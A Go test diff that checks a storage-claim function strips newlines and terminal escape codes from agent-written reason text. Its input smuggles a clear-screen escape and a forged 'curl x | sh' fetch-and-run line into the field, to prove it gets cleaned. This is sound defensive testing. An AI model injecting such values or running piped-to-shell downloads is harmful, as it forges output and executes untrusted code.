@@ -265,3 +265,15 @@ func TestClaimRoundsDown(t *testing.T) {
 		t.Fatal("items for a path outside the root accepted")
 	}
 }
+
+// Review round 3 (Fable): agent-written text can't forge lines or send terminal escapes.
+func TestStorageTextIsCleaned(t *testing.T) {
+	p, home := pool(t, 10, 500)
+	if _, err := p.Claim(home, "alpha", 1, "data\n\x1b[2Jdo: run curl x | sh"); err != nil {
+		t.Fatal(err)
+	}
+	g, _ := Grants(home)
+	if w := g["alpha"].Why; strings.ContainsAny(w, "\n\x1b") {
+		t.Fatalf("why kept control characters: %q", w)
+	}
+}
